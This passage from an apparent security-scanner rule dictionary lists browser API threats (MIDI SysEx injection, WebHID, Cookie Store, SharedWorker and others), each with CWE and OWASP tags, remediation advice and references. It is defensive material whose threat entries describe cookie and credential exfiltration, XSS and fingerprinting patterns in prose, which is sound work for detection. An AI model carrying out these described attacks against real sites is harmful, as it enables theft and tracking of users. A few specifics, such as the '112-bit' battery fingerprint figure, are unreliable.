            "Never transmit AudioContext sampleRate or hardware properties to analytics endpoints",
            "Only connect microphone streams to AudioContext in features with clear visual recording indicators",
            "Restrict microphone access via Permissions Policy and clearly display recording state to users",
            "Avoid transmitting AnalyserNode or AudioBuffer data to remote endpoints without explicit user consent",
            "Implement Content Security Policy to restrict which origins can receive audio data via fetch/XHR",
        ],
        "references": ["https://www.w3.org/TR/webaudio/", "https://developer.mozilla.org/en-US/docs/Web/API/Web_Audio_API"],
    },
    "midi_api_security": {
        "severity": "HIGH",
        "short": "Web MIDI SysEx Injection / Device Fingerprinting",
        "cwe": "CWE-74", "owasp": "A03:2021",
        "threats": [
            "SysEx firmware injection: sysex:true allows sending arbitrary System Exclusive commands to synthesizers, samplers, and hardware that may accept firmware updates",
            "SysEx from URL param: attacker crafts URL that sends malicious MIDI SysEx bytes to connected hardware",
            "Device enumeration fingerprinting: all MIDI inputs and outputs enumerated for a unique hardware fingerprint",
            "Device name to analytics: manufacturer/product name reveals connected music hardware — user profiling",
            "MIDI message replay attacks: captured MIDI data replayed to automate hardware actions without user presence",
        ],
        "remediation": [
            "Never request sysex:true unless absolutely necessary — review all System Exclusive message patterns",
            "Never derive MIDI send() payloads from URL parameters — validate all MIDI output data against an allowlist",
            "Limit MIDI device enumeration to the minimum scope required for the feature",
            "Do not transmit MIDI device names, manufacturer strings, or identifiers to analytics",
            "Implement rate limiting on MIDI output to prevent hardware DoS via message flooding",
        ],
        "references": ["https://webaudio.github.io/web-midi-api/", "https://developer.mozilla.org/en-US/docs/Web/API/Web_MIDI_API"],
    },
    "battery_status_security": {
        "severity": "MEDIUM",
        "short": "Battery Status Fingerprinting / Cross-Site Tracking",
        "cwe": "CWE-359", "owasp": "A05:2021",
        "threats": [
            "Battery fingerprinting: precise battery level (0-1 float) and charging state combination creates unique 112-bit-equivalent fingerprint",
            "Cross-site tracking: battery level stored in localStorage or cookies persists fingerprint across sessions and origins",
            "Analytics tracking: battery state shared with ad networks correlates user identity across browsers",
            "High-resolution timing: chargingTime/dischargingTime provides precise power supply state for Kalchschmidt-class fingerprinting",
            "Charging inference: charging pattern reveals user location (home/office) and device usage behaviour over time",
        ],
        "remediation": [
            "Avoid using navigator.getBattery() for any purpose that doesn't require direct power management",
            "Never transmit battery level, charging state, or timing values to analytics or advertising endpoints",
            "Do not store battery values in localStorage, sessionStorage, or cookies",
            "Browser vendors have already restricted this API — check if it is available before relying on it",
            "Declare Feature Policy to block battery access in third-party frames",
        ],
        "references": ["https://www.w3.org/TR/battery-status/", "https://developer.mozilla.org/en-US/docs/Web/API/Battery_Status_API"],
    },
    "hid_api_security": {
        "severity": "HIGH",
        "short": "WebHID Device Injection / Input Exfiltration",
        "cwe": "CWE-74", "owasp": "A03:2021",
        "threats": [
            "Empty device filters: requestDevice({filters:[]}) allows selecting any connected HID device — keyboard, gamepad, security key",
            "Device enumeration: getDevices() returns all previously granted HID devices — fingerprinting and unauthorized reuse",
            "HID write from URL param: attacker-controlled URL injects arbitrary HID reports — potential keyboard emulation or firmware commands",
            "Device info exfiltration: productId and vendorId reveal exact hardware model — precise device fingerprinting",
            "Input report capture: raw HID input reports from keyboards or biometric readers transmitted to server",
        ],
        "remediation": [
            "Always specify productId and vendorId in HID device filters — never use empty filter arrays",
            "Cache the HIDDevice reference securely rather than re-enumerating with getDevices() on every page load",
            "Never derive HID report payloads from URL parameters — validate all HID output against strict allowlists",
            "Do not transmit HID device identifiers or input reports to remote servers without explicit user consent",
            "Restrict WebHID via Permissions Policy header — block it from all third-party origins",
        ],
        "references": ["https://wicg.github.io/webhid/", "https://developer.mozilla.org/en-US/docs/Web/API/WebHID_API"],
    },
    "import_map_security": {
        "severity": "HIGH",
        "short": "Import Map Dependency Confusion / Module Hijacking",
        "cwe": "CWE-829", "owasp": "A06:2021",
        "threats": [
            "CDN dependency confusion: import map specifier resolves to external URL — attacker registers malicious package at CDN URL",
            "Module override: well-known package (react, lodash) mapped to attacker-controlled URL — all module imports hijacked",
            "Dynamic importmap injection: import map written via innerHTML/document.write — DOM-based module hijacking",
            "External scopes: import map scopes redirect specific paths to external origins — scoped module exfiltration",
            "Missing integrity: import map without integrity attribute allows map tampering by MitM or CDN compromise",
        ],
        "remediation": [
            "Use integrity attribute on import map script tags: <script type=\"importmap\" integrity=\"sha384-...\">",
            "Never inject import maps via innerHTML, document.write, or insertAdjacentHTML",
            "Pin external specifiers to specific CDN subresource integrity hashes rather than mutable URLs",
            "Prefer local bundling over import maps pointing to CDN URLs for security-critical code",
            "Implement CSP script-src with 'strict-dynamic' to restrict what modules can execute",
        ],
        "references": ["https://wicg.github.io/import-maps/", "https://developer.mozilla.org/en-US/docs/Web/HTML/Element/script/type/importmap"],
    },
    "navigation_api_security": {
        "severity": "MEDIUM",
        "short": "Navigation API URL Tracking / Open Redirect",
        "cwe": "CWE-601", "owasp": "A01:2021",
        "threats": [
            "URL tracking: destination URL transmitted to analytics on every navigation — complete user journey tracking",
            "URL param open redirect: navigate event handler redirects based on URL parameter — attacker crafts link to redirect victim",
            "All navigations intercepted: overbroad intercept suppresses browser back-button and security navigation behaviours",
            "URL bar spoofing: transitionWhile modifying document.title/location during navigation — phishing via URL bar deception",
            "History traversal injection: traverseTo() with URL param enables attacker to navigate victim's history",
        ],
        "remediation": [
            "Never transmit navigation destination URLs to analytics or third-party endpoints without explicit user consent",
            "Validate all navigate-based redirects against an allowlist — never use raw URL parameter as navigation target",
            "Limit navigation event interception to specific route patterns — avoid catch-all intercept",
            "Validate that transitionWhile handlers do not modify document.title or location to mislead users",
            "Sanitize traverseTo() arguments — never use user-provided strings as navigation history keys",
        ],
        "references": ["https://wicg.github.io/navigation-api/", "https://developer.mozilla.org/en-US/docs/Web/API/Navigation_API"],
    },
    "sanitizer_api_security": {
        "severity": "HIGH",
        "short": "Sanitizer API Misconfiguration / XSS Bypass",
        "cwe": "CWE-79", "owasp": "A03:2021",
        "threats": [
            "Allowlist includes script: allowElements containing 'script' completely defeats XSS protection",
            "Event handler attributes allowed: allowAttributes with 'onclick'/'onload' enables inline event handler XSS injection",
            "Untrusted input to setHTML: URL parameter or external content passed directly to setHTML() without validation",
            "No explicit sanitizer config: setHTML() without Sanitizer instance uses default config which may permit dangerous content",
            "Href/src without protocol filter: allowing href/src attributes without blocking data:/javascript: enables XSS via attribute injection",
        ],
        "remediation": [
            "Never include 'script' in Sanitizer allowElements — this defeats all sanitization",
            "Exclude all on* event handler attributes from Sanitizer allowAttributes",
            "Validate and sanitize input before passing to setHTML() — Sanitizer is a second layer, not first defense",
            "Always pass an explicit Sanitizer instance to setHTML() with a strict allowlist",
            "Implement Content Security Policy as a defense-in-depth measure alongside Sanitizer API",
        ],
        "references": ["https://wicg.github.io/sanitizer-api/", "https://developer.mozilla.org/en-US/docs/Web/API/HTML_Sanitizer_API"],
    },
    "portals_security": {
        "severity": "HIGH",
        "short": "Portals SSRF / Sensitive Page Embedding",
        "cwe": "CWE-918", "owasp": "A10:2021",
        "threats": [
            "SSRF via portal src: portal src set from URL parameter enables server-side request forgery through the portal fetch",
            "Sensitive page in portal: admin/dashboard pages embedded in a portal context visible to potential clickjacking",
            "Auth data on activate: portal.activate() passing session tokens/auth data to the navigated page over postMessage channel",
            "Auto-activate without gesture: portal activated on page load performs navigation without user intent",
            "Missing origin check on message: portal communication without event.origin validation enables cross-origin message injection",
        ],
        "remediation": [
            "Never set portal src from URL parameters — hardcode portal src from a trusted allowlist",
            "Do not embed sensitive internal pages (admin, dashboard, settings) in portal contexts",
            "Never pass authentication tokens or session data in portal.activate() — use secure post-navigation auth flows",
            "Only call portal.activate() in response to explicit user gestures",
            "Validate event.origin in all portal message handlers before processing",
        ],
        "references": ["https://wicg.github.io/portals/", "https://developer.chrome.com/blog/portals/"],
    },
    "trusted_types_security": {
        "severity": "HIGH",
        "short": "Trusted Types Policy Bypass / DOM XSS",
        "cwe": "CWE-79", "owasp": "A03:2021",
        "threats": [
            "Default policy override: createPolicy('default') replaces the browser's built-in TT enforcement — all unsafe sinks become allowed globally",
            "HTML passthrough policy: createHTML callback returns input unchanged — sanitization is completely bypassed despite TT enforcement",
            "Script passthrough policy: createScript returns input unchanged — arbitrary code execution bypasses TT script sink protection",
            "innerHTML from URL parameter: DOM XSS sink assigned from location.searchParams without TrustedHTML wrapper — TT headers present but bypassed in code",
            "eval alongside Trusted Types: eval() or new Function() used in same codebase — bypasses TT's protection of script sinks",
        ],
        "remediation": [
            "Never create a 'default' named policy — it overrides the browser enforcement globally",
            "Ensure createHTML/createScript callbacks perform real sanitization (DOMPurify etc.) not identity transforms",
            "Always wrap URL parameter content in a TrustedHTML value before assigning to innerHTML/outerHTML",
            "Pair Trusted Types API with require-trusted-types-for 'script' CSP header",
            "Eliminate eval() and new Function() — use Trusted Types to block dynamic code execution sinks",
        ],
        "references": ["https://w3c.github.io/trusted-types/dist/spec/", "https://developer.mozilla.org/en-US/docs/Web/API/Trusted_Types_API"],
    },
    "font_loading_security": {
        "severity": "MEDIUM",
        "short": "Font Loading API Fingerprinting / SSRF",
        "cwe": "CWE-200", "owasp": "A01:2021",
        "threats": [
            "Font timing oracle: document.fonts.check() timing via performance.now reveals which local fonts are installed — precision device fingerprinting",
            "Font data exfiltration: font availability or family list sent to remote endpoint — user font fingerprint cross-site tracking",
            "FontFace src from URL parameter: attacker controls font fetch target — SSRF probe or CSP font-src bypass",
            "data: URI font from URL param: base64-encoded font injected via URL — bypasses font-src CSP directive",
            "@font-face SSRF probe: absolute external URL in CSS font-src performs GET request to attacker server — SSRF via stylesheet injection",
        ],
        "remediation": [
            "Never derive FontFace source URL from URL parameters — restrict font sources to a hardcoded list",
            "Add font-src CSP directive to restrict which origins can serve fonts",
            "Avoid transmitting font availability or timing data to analytics endpoints",
            "Restrict @font-face src to same-origin or explicitly trusted CDNs",
            "Use font-display: optional to reduce timing side-channels from font loading",
        ],
        "references": ["https://www.w3.org/TR/css-font-loading-3/", "https://developer.mozilla.org/en-US/docs/Web/API/FontFace"],
    },
    "back_forward_cache_security": {
        "severity": "MEDIUM",
        "short": "BFCache Auth State Leakage",
        "cwe": "CWE-613", "owasp": "A07:2021",
        "threats": [
            "Stale auth token restored: session token re-used from localStorage on pageshow persisted without re-validation — expired or revoked session accepted",
            "Auth page in BFCache: login/logout page survives in bfcache — shared computer scenario exposes authenticated session via back-button",
            "Form value restoration: password or sensitive form field value restored from cached DOM on bfcache restore",
            "Sensitive variables not cleared: auth tokens in global scope persist in memory during BFCache window — accessible to future page activations",
            "Back-button navigation tracking: getEntriesByType('navigation') used to detect BFCache restore and send to analytics — user navigation behaviour surveillance",
        ],
        "remediation": [
            "Set Cache-Control: no-store on authenticated pages to opt out of BFCache",
            "On pageshow with event.persisted=true, re-validate session server-side before continuing",
            "Clear sensitive variables in pagehide handler before BFCache snapshot",
            "Reset and clear form fields in pageshow handler after BFCache restore",
            "Do not transmit navigation type (back_forward) to analytics — it reveals browsing behaviour",
        ],
        "references": ["https://web.dev/bfcache/", "https://developer.mozilla.org/en-US/docs/Web/API/Window/pageshow_event"],
    },
    "scheduler_api_security": {
        "severity": "MEDIUM",
        "short": "Scheduler API Data Exfiltration / Task Abuse",
        "cwe": "CWE-311", "owasp": "A02:2021",
        "threats": [
            "Task data exfiltration: postTask callback reads localStorage/cookies and transmits to remote — sensitive data sent via scheduled task evading monitoring",
            "Credentials in task payload: apiKey/authToken/password referenced inside postTask callback — credential exposure in scheduled background task",
            "Timing oracle: postTask completion time measured and transmitted — timing side-channel revealing computation or auth state",
            "TaskController abort from URL param: attacker triggers controller.abort() via URL parameter — legitimate user tasks cancelled by malicious link",
            "Priority manipulation from URL param: task priority set from URL parameter — attacker boosts malicious tasks or starves legitimate ones",
        ],
        "remediation": [
            "Never read localStorage, sessionStorage, or cookies inside postTask callbacks that transmit data externally",
            "Avoid including credential variable names (apiKey, authToken) directly in postTask callback scope",
            "Do not measure postTask timing via performance.now and send to external endpoints",
            "Derive TaskController.abort() triggers only from internal application state, never from URL parameters",
            "Hardcode task priorities — never allow user-supplied input to influence task scheduling priority",
        ],
        "references": ["https://wicg.github.io/scheduling-apis/", "https://developer.mozilla.org/en-US/docs/Web/API/Scheduler/postTask"],
    },
    "message_channel_security": {
        "severity": "HIGH",
        "short": "MessageChannel Port Leakage / Cross-Origin Messaging",
        "cwe": "CWE-346", "owasp": "A01:2021",
        "threats": [
            "Port to wildcard origin: MessageChannel port transferred via postMessage with targetOrigin='*' — any cross-origin page can receive the communication channel",
            "Sensitive data via port: auth tokens, passwords, or API keys sent through a MessagePort without verifying the recipient",
            "Port to URL-param target: port transferred to a window/worker identified by URL parameter — attacker controls port recipient via link crafting",
            "No origin check on port.onmessage: messages processed from any origin without event.origin validation — cross-origin message injection",
            "Port serialized to storage: MessagePort object stored in localStorage/sessionStorage — ports cannot be safely serialized, risks data corruption and channel loss",
        ],
        "remediation": [
            "Always specify the exact target origin when calling postMessage to transfer a port — never use '*'",
            "Validate event.origin in port.onmessage before processing any received message",
            "Never derive the postMessage target from URL parameters — use hardcoded or server-provided trusted origins",
            "Do not send credentials or auth tokens through MessageChannel ports without encryption and origin verification",
            "MessagePort objects cannot be cloned — do not attempt to serialize them to Web Storage",
        ],
        "references": ["https://developer.mozilla.org/en-US/docs/Web/API/MessageChannel", "https://html.spec.whatwg.org/multipage/web-messaging.html"],
    },
    "shared_worker_security": {
        "severity": "HIGH",
        "short": "SharedWorker Cross-Tab Data Exposure",
        "cwe": "CWE-668", "owasp": "A01:2021",
        "threats": [
            "Worker URL from URL param: new SharedWorker(searchParams.get('worker')) loads attacker-controlled script — arbitrary code execution in shared worker scope",
            "Sensitive global state: auth tokens or API keys stored in SharedWorker global scope shared across all connected tabs — any tab can read the credentials",
            "Broadcasts sensitive data: SharedWorker posts auth tokens to all connected ports — every open browser tab receives the credentials",
            "Aggregates and exfiltrates: SharedWorker collects data from multiple client tabs and transmits as an aggregate — cross-tab user behaviour exfiltration",
            "No origin check on connect: onconnect handler processes all clients without origin validation — cross-origin pages sharing the same worker can inject messages",
        ],
        "remediation": [
            "Never derive SharedWorker URL from URL parameters — hardcode the worker script path",
            "Do not store authentication tokens or API keys in SharedWorker global scope",
            "Validate event.origin in the onconnect handler before accepting a new port connection",
            "Use unique nonces or tokens per-tab to prevent cross-tab credential sharing via SharedWorker",
            "Prefer DedicatedWorker over SharedWorker when cross-tab sharing is not required",
        ],
        "references": ["https://developer.mozilla.org/en-US/docs/Web/API/SharedWorker", "https://html.spec.whatwg.org/multipage/workers.html"],
    },
    "storage_manager_security": {
        "severity": "MEDIUM",
        "short": "StorageManager Fingerprinting / Quota Probing",
        "cwe": "CWE-200", "owasp": "A01:2021",
        "threats": [
            "Estimate exfiltration: storage quota/usage values transmitted to analytics — precise device storage fingerprint sent to third party",
            "Site-visit detection probe: quota usage delta computed to infer whether user has visited other sites — cross-site browsing history inference",
            "Auto-persist on load: storage.persist() called automatically — page silently requests permanent storage without user consent flow",
            "Quota disclosed to console: storage capacity logged — reveals device hardware profile to potential XSS attacker reading console",
            "Quota side-channel: application branches on remaining storage — attacker fills storage to manipulate application behaviour or detect fill level",
        ],
        "remediation": [
            "Never transmit storage estimate (quota/usage) to analytics or third-party endpoints",
            "Only call storage.persist() in response to an explicit user action (button click), not on page load",
            "Do not log storage quota/usage to console in production — this reveals device profile to potential XSS attackers",
            "Do not implement behaviour that depends on the exact remaining storage quota — it enables side-channel manipulation",
            "Partition storage (as modern browsers do) to limit cross-site storage side-channels",
        ],
        "references": ["https://developer.mozilla.org/en-US/docs/Web/API/StorageManager", "https://storage.spec.whatwg.org/"],
    },
    "periodic_background_sync_security": {
        "severity": "HIGH",
        "short": "Periodic Background Sync Data Exfiltration",
        "cwe": "CWE-311", "owasp": "A02:2021",
        "threats": [
            "Sync tag from URL param: attacker registers arbitrary background sync tag via URL manipulation — silent recurring task registered by visiting a link",
            "Recurring data exfiltration: periodic sync handler reads localStorage/cookies and transmits to remote — continues exfiltrating after user leaves site",
            "Very short minInterval: near-continuous background sync requests without user awareness — bandwidth abuse and persistent background network access",
            "Location beacon: periodic sync beacons geolocation to server — continuous background location tracking after initial page visit",
            "Remote data injection: sync handler fetches attacker-controlled data and writes to local storage — persistent server-push injection into browser storage",
        ],
        "remediation": [
            "Never derive periodic sync tag or minInterval from URL parameters — hardcode all sync registration parameters",
            "Ensure periodicsync event handlers do not read and transmit user data to external endpoints",
            "Set minInterval to a reasonable value (e.g., 86400000ms = 24h) appropriate to the feature — avoid intervals under an hour",
            "Validate the source and content of any data fetched during periodic sync before writing to IndexedDB or localStorage",
            "Implement strict CSP and network request allowlists in service workers to prevent unauthorized transmissions",
        ],
        "references": ["https://wicg.github.io/periodic-background-sync/", "https://developer.mozilla.org/en-US/docs/Web/API/Web_Periodic_Background_Synchronization_API"],
    },
    "css_paint_api_security": {
        "severity": "MEDIUM",
        "short": "CSS Houdini Paint Worklet Abuse",
        "cwe": "CWE-829", "owasp": "A06:2021",
        "threats": [
            "Worklet from URL param: paintWorklet.addModule(URL_PARAM) loads attacker-controlled worklet script — arbitrary code execution in paint worklet origin",
            "CSS property from URL param: style.setProperty('--data', URL_PARAM) feeds attacker-controlled data into paint worklet — attacker controls rendering via URL",
            "CSS property exfiltrated: paint worklet inputProperties values transmitted to remote — CSS custom property contents (including sensitive data) sent to attacker server",
            "Paint timing oracle: worklet paint timing measured and transmitted — rendering time reveals content layout, element sizes, or data presence",
            "DOM access attempt: paint worklet code references document/window — indicates prototype pollution bypass attempt in worklet sandbox",
        ],
        "remediation": [
            "Never derive paint worklet module URLs from user input — hardcode module paths",
            "Sanitize CSS custom property values set from URL parameters before they enter paint worklet scope",
            "Paint worklets must not make network requests with inputProperties values",
            "Restrict paint worklet module sources with a strict CSP worker-src directive",
            "Monitor for DOM property access patterns in paint worklets — they should never access document or window",
        ],
        "references": ["https://www.w3.org/TR/css-houdini-drafts/#paintrenderingcontext2d", "https://developer.mozilla.org/en-US/docs/Web/API/CSS_Painting_API"],
    },
    "css_custom_highlight_security": {
        "severity": "MEDIUM",
        "short": "CSS Custom Highlight API Tracking / Injection",
        "cwe": "CWE-200", "owasp": "A01:2021",
        "threats": [
            "Highlight range from URL param: Range created from URL parameter fragment/hash — attacker highlights specific page text via URL crafting (text fragment equivalent)",
            "Highlight name from URL param: CSS.highlights.set() called with attacker-controlled name — attacker selects which CSS ::highlight() pseudo-element styles apply",
            "User selection tracking: getSelection() result converted to Custom Highlight — page records what text content the user highlighted or selected",
            "Highlighted text exfiltrated: highlighted or selected text content transmitted to remote — reading pattern and selected content surveillance",
            "Server-controlled highlights: highlights created from server-fetched data — server can remotely highlight or visually emphasize arbitrary page content",
        ],
        "remediation": [
            "Never create Range objects from URL hash or search parameters for highlight purposes",
            "Do not transmit selected or highlighted text to analytics or remote endpoints without explicit user consent",
            "Sanitize CSS.highlights.set() name parameter if derived from any external input",
            "Audit server-fetched highlight data for injection of misleading or phishing highlight ranges",
            "Implement CSP to restrict script execution that reads user selection state",
        ],
        "references": ["https://www.w3.org/TR/css-highlight-api-1/", "https://developer.mozilla.org/en-US/docs/Web/API/CSS_Custom_Highlight_API"],
    },
    "url_protocol_handler_security": {
        "severity": "HIGH",
        "short": "Protocol Handler Registration Abuse / Phishing",
        "cwe": "CWE-601", "owasp": "A01:2021",
        "threats": [
            "Handler URL from URL param: registerProtocolHandler target URL derived from URL parameter — attacker registers their server as handler via URL manipulation",
            "Built-in protocol override: registering http/https/ftp handler — if permitted, intercepts all browser navigation (blocked by browsers but indicates malicious intent)",
            "Sensitive protocol handler: mailto/tel/sms handler registered — all email links and phone links on the device handled by this origin",
            "Auto-registered on load: handler registered silently on page load — user visits page and gains a background protocol handler without any user action",
            "%s placeholder injection: URL parameter injected into handler URL template — attacker controls data sent to handler when protocol link is clicked",
        ],
        "remediation": [
            "Never derive registerProtocolHandler URL from URL parameters — hardcode the handler URL",
            "Only call registerProtocolHandler in response to an explicit user action (button click)",
            "Restrict protocol handler registration to web+ prefixed custom protocols — avoid mailto/tel/sms",
            "Validate the %s placeholder URL is always URL-encoded and sanitized on the receiving end",
            "Implement CSP to restrict which APIs can be called on security-sensitive pages",
        ],
        "references": ["https://html.spec.whatwg.org/multipage/system-state.html#custom-handlers", "https://developer.mozilla.org/en-US/docs/Web/API/Navigator/registerProtocolHandler"],
    },
    "launch_handler_security": {
        "severity": "HIGH",
        "short": "Launch Handler targetURL Injection / Redirect",
        "cwe": "CWE-601", "owasp": "A01:2021",
        "threats": [
            "Open redirect via targetURL: launch handler uses targetURL directly as navigation target — attacker crafts PWA launch URL to redirect victim to phishing site",
            "XSS via targetURL to innerHTML: launch targetURL passed to innerHTML/outerHTML — DOM XSS through malicious PWA launch URL",
            "Script load from launch URL: targetURL used to dynamically import or load script — arbitrary remote code execution via crafted launch invocation",
            "Launch URL exfiltrated: targetURL (containing potentially sensitive path/params) transmitted to analytics — user's launch context sent to third party",
            "Launch URL stored unsanitized: targetURL written to localStorage without validation — persists attacker-controlled URL for future application use",
        ],
        "remediation": [
            "Validate launch params.targetURL against an allowlist before using it as a navigation target",
            "Never pass launch targetURL to innerHTML, outerHTML, document.write, or dynamic import()",
            "Do not transmit launch targetURL to analytics endpoints — it may contain sensitive path parameters",
            "Sanitize targetURL before storing to localStorage — treat it as untrusted external input",
            "Implement launch URL validation in the service worker fetch handler as an additional defense layer",
        ],
        "references": ["https://wicg.github.io/web-app-launch/", "https://developer.mozilla.org/en-US/docs/Web/Manifest/launch_handler"],
    },
    "element_timing_security": {
        "severity": "MEDIUM",
        "short": "Element Timing API Layout Fingerprinting",
        "cwe": "CWE-200", "owasp": "A01:2021",
        "threats": [
            "Render time exfiltrated: element renderTime/loadTime transmitted to analytics — precise layout timing leaked (pixel-perfect layout fingerprinting)",
            "Auth oracle via element timing: avatar/profile image render time correlated with login state — detect whether user is authenticated via image load timing",
            "Content inference: element render time correlated with src/url identifier — content type or caching status inferred from timing",
            "Bulk observer exfiltration: PerformanceObserver 'element' entries bulk-transmitted to remote — complete element render timeline sent to attacker",
            "Cross-origin timing probe: element timing used with cross-origin assets — probe which third-party resources a user has cached (browsing history inference)",
        ],
        "remediation": [
            "Do not transmit element render timing (renderTime, loadTime, startTime) to analytics or remote endpoints",
            "Avoid correlating element render time with authentication state or user identity",
            "Restrict cross-origin element timing by ensuring CORP/COEP headers are set on embedded resources",
            "Audit PerformanceObserver 'element' entries — do not bulk-send them to external endpoints",
            "Consider using Timing-Allow-Origin carefully — only expose timing for resources that cannot be used as side-channels",
        ],
        "references": ["https://wicg.github.io/element-timing/", "https://developer.mozilla.org/en-US/docs/Web/API/PerformanceElementTiming"],
    },
    "document_visibility_security": {
        "severity": "MEDIUM",
        "short": "Document Visibility API Tab Surveillance",
        "cwe": "CWE-200", "owasp": "A01:2021",
        "threats": [
            "Visibility state exfiltrated: visibilitychange transmits document.visibilityState to analytics — user tab-switching behaviour sent to remote server",
            "Focus timing tracked: time-in-focus calculated via performance.now on visibilitychange and transmitted — precise user attention duration exfiltrated",
            "Payment flow detection: visibilitychange correlated with payment/checkout state — payment process timing and interruption monitored",
            "Away time exfiltrated: total time tab was hidden (awayTime) calculated and transmitted — user absence from page tracked and sent to analytics",
            "State not cleared on hide: sensitive variables remain accessible when tab is hidden — data exposed during BFCache or multi-tab access",
        ],
        "remediation": [
            "Do not transmit visibilityState or document.hidden values to analytics platforms",
            "Do not measure and transmit time-in-focus or time-away metrics to remote endpoints without explicit user consent",
            "Avoid correlating page visibility with payment or checkout flows in transmitted telemetry",
            "Clear sensitive data (tokens, form values) when document becomes hidden — do not just pause timers",
            "Implement privacy budget controls if using visibility API alongside other timing/fingerprinting APIs",
        ],
        "references": ["https://www.w3.org/TR/page-visibility-2/", "https://developer.mozilla.org/en-US/docs/Web/API/Document/visibilityState"],
    },
    "screen_details_security": {
        "severity": "MEDIUM",
        "short": "Screen Details API Multi-Monitor Fingerprinting",
        "cwe": "CWE-200", "owasp": "A01:2021",
        "threats": [
            "Screen details exfiltrated: getScreenDetails() result transmitted to analytics — full multi-monitor display hardware fingerprint sent to remote",
            "Screen label exfiltrated: ScreenDetailed.label or deviceId transmitted — unique hardware display identifier creates stable cross-session fingerprint",
            "Monitor count disclosed: screens.length or isExtended transmitted — number of connected monitors reveals workstation type and setup",
            "Resolution/depth exfiltrated: width/height/colorDepth/pixelRatio per screen transmitted — precise display configuration fingerprint",
            "Auto permission request: getScreenDetails() called on load — silently prompts user for screen permission without user action",
        ],
        "remediation": [
            "Never transmit getScreenDetails() results, screen labels, or screen counts to analytics or remote endpoints",
            "Only call getScreenDetails() in response to explicit user actions (e.g., open-in-new-window button)",
            "Restrict Screen Details API usage in CSP using Permissions-Policy: window-management=()",
            "Do not store screen hardware identifiers (label, deviceId) in localStorage or transmit to any endpoint",
            "Audit all PerformanceObserver and screen API usage for fingerprinting data leakage to third-party analytics",
        ],
        "references": ["https://www.w3.org/TR/window-management/", "https://developer.mozilla.org/en-US/docs/Web/API/Window/getScreenDetails"],
    },
    "longtask_observer_security": {
        "severity": "MEDIUM",
        "short": "Long Task Observer CPU Timing Side-Channel",
        "cwe": "CWE-385", "owasp": "A02:2021",
        "threats": [
            "Task timing exfiltrated: long task duration/startTime transmitted to remote — CPU load timing data leaked enabling hardware profiling",
            "Attribution disclosed cross-origin: task containerSrc/containerName transmitted — which cross-origin frame caused CPU contention disclosed to attacker",
            "Crypto timing oracle: long task timing correlated with encryption operations — timing side-channel enables brute-force of key material or algorithm detection",
            "CPU fingerprinting: task duration patterns correlated with device/CPU profile — hardware performance characteristics exfiltrated via task timing",
            "Cross-origin computation inference: iframe-attributed long tasks reveal computation in embedded cross-origin content — privacy boundary bypass",
        ],
        "remediation": [
            "Do not transmit long task duration or startTime values to analytics or external endpoints",
            "Never correlate long task timing with cryptographic operations and transmit results externally",
            "Avoid transmitting task attribution (containerSrc, containerName) to remote endpoints — cross-origin privacy leak",
            "Implement process isolation (COOP, COEP, CORP) to limit cross-origin long task attribution visibility",
            "Use Permissions-Policy to restrict PerformanceObserver usage to trusted origins if possible",
        ],
        "references": ["https://w3c.github.io/longtasks/", "https://developer.mozilla.org/en-US/docs/Web/API/PerformanceLongTaskTiming"],
    },
    "view_transition_security": {
        "severity": "MEDIUM",
        "short": "View Transition API Snapshot / Content Capture",
        "cwe": "CWE-200", "owasp": "A01:2021",
        "threats": [
            "Sensitive content snapshot: startViewTransition callback renders sensitive data (tokens/auth) — captured in transition screenshot shared with GPU/compositor",
            "Transition name from URL param: view-transition-name derived from URL parameter — attacker forces specific elements to be captured in animation frame",
            "Snapshot exfiltrated: transition snapshot captured via toDataURL/toBlob and transmitted — visual page screenshot sent to attacker server",
            "Cross-document content leak: cross-document view transitions capture content from the incoming page — information from the navigation target leaked in animation",
            "Element capture via CSS injection: style.setProperty('view-transition-name') from URL param — attacker controls which element's visual snapshot is used in transition",
        ],
        "remediation": [
            "Clear sensitive content (auth tokens, form values) before calling startViewTransition",
            "Never derive view-transition-name from URL parameters, hash, or searchParams",
            "Do not call toDataURL/toBlob or make network requests inside startViewTransition callbacks",
            "Audit cross-document view transitions — ensure incoming page content doesn't expose sensitive paths in transition animations",
            "Restrict @view-transition rule to explicitly opted-in page pairs using allow: same-origin only",
        ],
        "references": ["https://www.w3.org/TR/css-view-transitions-1/", "https://developer.mozilla.org/en-US/docs/Web/API/Document/startViewTransition"],
    },
    "document_pip_api_security": {
        "severity": "HIGH",
        "short": "Document PiP Window Cross-Context Exposure",
        "cwe": "CWE-668", "owasp": "A01:2021",
        "threats": [
            "Sensitive content in PiP: password/token/auth/payment content rendered in PiP window — displayed in uncontrolled floating context visible outside browser tab",
            "PiP accesses parent DOM via opener: pipWindow.opener.document — cross-context DOM read breaks expected window isolation",
            "Auth data via postMessage from PiP: session tokens transmitted via postMessage from PiP window — credentials exfiltrated through cross-context messaging",
            "URL param controls PiP content: requestWindow() with URL-param-derived settings — attacker manipulates PiP overlay dimensions or content",
            "Auto-opens on load: PiP window requested on DOMContentLoaded — unexpected floating overlay appears without user interaction",
        ],
        "remediation": [
            "Never render authentication tokens, passwords, or payment details inside PiP windows",
            "Restrict PiP window access to parent document — do not expose opener or parent references",
            "Validate origin of all postMessage events received from PiP window before processing",
            "Only open PiP windows in response to explicit user gestures (click, button)",
            "Set appropriate Permissions-Policy: document-picture-in-picture=() to restrict the API to trusted contexts",
        ],
        "references": ["https://wicg.github.io/document-picture-in-picture/", "https://developer.chrome.com/docs/web-platform/document-picture-in-picture/"],
    },
    "cookie_store_security": {
        "severity": "HIGH",
        "short": "Cookie Store API Cookie Injection / Jar Exfiltration",
        "cwe": "CWE-384", "owasp": "A07:2021",
        "threats": [
            "Cookie value from URL param: cookieStore.set() value sourced from URL parameter — attacker injects arbitrary cookie values via URL crafting",
            "Full cookie jar exfiltrated: cookieStore.getAll() result transmitted to remote — entire accessible cookie jar sent to attacker server",
            "Change event exfiltration: cookieStore change listener automatically transmits newly set cookies — real-time cookie interception relay",
            "Set without Secure flag: cookieStore.set() without secure:true — cookie transmitted over HTTP connections in cleartext",
            "Sensitive cookie logged: auth/session cookie read via cookieStore and logged to console — credential disclosure to any XSS attacker with console access",
        ],
        "remediation": [
            "Never derive cookieStore.set() values from URL parameters — treat all URL input as untrusted",
            "Do not transmit cookieStore.getAll() results to any external endpoint",
            "Remove cookieStore change event listeners that forward cookie changes to remote endpoints",
            "Always set secure:true and sameSite:'strict' when using cookieStore.set()",
            "Use HttpOnly cookies via server-side Set-Cookie header for sensitive session cookies — they are inaccessible to JavaScript including Cookie Store API",
        ],
        "references": ["https://wicg.github.io/cookie-store/", "https://developer.mozilla.org/en-US/docs/Web/API/CookieStore"],
    },
